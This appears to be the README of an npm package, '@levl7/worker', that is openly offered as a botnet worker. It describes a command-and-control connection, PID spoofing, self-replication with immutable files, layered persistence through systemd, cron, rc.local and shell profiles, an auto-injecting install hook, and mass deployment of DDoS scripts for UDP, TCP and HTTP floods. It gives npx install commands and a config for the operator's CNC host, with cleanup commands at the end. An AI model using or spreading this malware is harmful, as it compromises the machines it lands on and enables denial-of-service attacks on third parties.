# @levl7/worker v2

Persistent CNC worker with PID injection, binary injection, and mass DDoS script deployment.

## Quick Start

```bash
# Install globally (auto-injects into system)
sudo npm i -g @levl7/worker

# Or run directly without install
npx @levl7/worker

# Or inject into CNC
CNC_HOST=your-server-ip npx @levl7/worker inject
```

## NPX Usage

```bash
# Run worker (connects to CNC)
npx @levl7/worker

# Inject worker into system
npx @levl7/worker inject

# With custom CNC
CNC_HOST=192.168.1.100 CNC_PORT=8080 npx @levl7/worker
```

## Features

### PID Injection
- Writes spoofed PID to `/tmp/.levl7-pid`
- Random PID generation (1024-65535)
- Auto-avoidance of used PIDs
- Immutable PID file (chattr +i)

### Binary Injection
- Self-replicates to `~/.levl7-svc`, `/usr/local/bin/.levl7-svc`
- Sets immutable flag on all copies
- Watchdog process monitors and re-injects if removed

### Unkillable Persistence
- **systemd** service with auto-restart (Restart=always, RestartSec=2)
- **crontab** fallback (every minute)
- **rc.local** boot persistence
- **init.d** sysv compatibility
- **profile** injection (/etc/profile, ~/.bashrc)
- Each layer independently monitored and restored

### Mass Script Deployment
Admin uploads DDoS scripts via CNC panel → deploys to workers:
- JavaScript (`.js`) - runs via node
- Python (`.py`) - runs via python3
- Shell (`.sh`) - runs via bash
- Binary (any) - executes directly
- Go binary included: `levl7-ddoser`

### Attack Methods
- UDP flood (raw socket)
- TCP flood (connection flood)
- HTTP/HTTPS flood (layer 7)
- Custom scripts (upload any language)

## Architecture

```
Worker Node
  ├── index.js        # Main worker (PID inject + heartbeat + command fetch)
  ├── inject.js       # Standalone injector
  ├── install.js      # npm post-install hook
  ├── ddos.js         # DDoS execution engine
  ├── persist.js      # Persistence layer
  ├── ddos/           # Compiled Go DDoS binary
  │   └── levl7-ddoser
  └── master.json     # Config (hardcoded CNC host/port)
```

## Configuration

Edit `master.json`:
```json
{
  "cnc_host": "YOUR_CNC_IP",
  "cnc_port": "8080",
  "worker_id": "wkr_...",
  "debug": false
}
```

Or via env vars:
```bash
CNC_HOST=1.2.3.4 CNC_PORT=8080 DEBUG=true npx @levl7/worker
```

## Uninstall

```bash
# Remove systemd service
systemctl stop levl7-worker 2>/dev/null
systemctl disable levl7-worker 2>/dev/null
rm -f /etc/systemd/system/levl7-worker.service

# Remove binaries
rm -f ~/.levl7-svc /usr/local/bin/.levl7-svc /opt/.levl7-svc

# Remove markers
rm -f /tmp/.levl7-pid /tmp/.levl7-port /tmp/.levl7-injected /tmp/.levl7-watchdog

# Remove crontab
crontab -l | grep -v levl7 | crontab -

# Remove rc.local entry
sed -i '/levl7/d' /etc/rc.local

# Remove profile entries
sed -i '/LEVL7_LOADED/d' /etc/profile ~/.profile ~/.bashrc
```
